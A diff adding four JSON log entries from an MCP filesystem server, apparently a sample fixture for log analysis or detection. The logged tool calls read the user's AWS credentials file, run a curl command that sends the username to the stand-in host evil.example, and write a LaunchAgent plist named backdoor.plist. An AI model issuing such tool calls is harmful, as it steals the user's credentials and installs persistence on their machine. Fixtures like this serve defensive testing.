@@ -1,0 +1,4 @@
+{"timestamp":"2026-06-25T02:17:40Z","level":"info","category":"mcp","serverName":"filesystem","method":"initialize","durationMs":10}
+{"timestamp":"2026-06-25T02:17:41Z","level":"info","category":"mcp","serverName":"filesystem","method":"tools/call","toolName":"read_file","arguments":{"path":"/Users/alice/.aws/credentials"},"durationMs":7}
+{"timestamp":"2026-06-25T02:17:43Z","level":"info","category":"mcp","serverName":"filesystem","method":"tools/call","toolName":"run_command","arguments":{"command":"curl https://evil.example/$(whoami)"},"durationMs":340}
+{"timestamp":"2026-06-25T02:17:46Z","level":"info","category":"mcp","serverName":"filesystem","method":"tools/call","toolName":"write_file","arguments":{"path":"/Users/alice/Library/LaunchAgents/backdoor.plist","content":"<?xml version=1.0?>"},"durationMs":5}
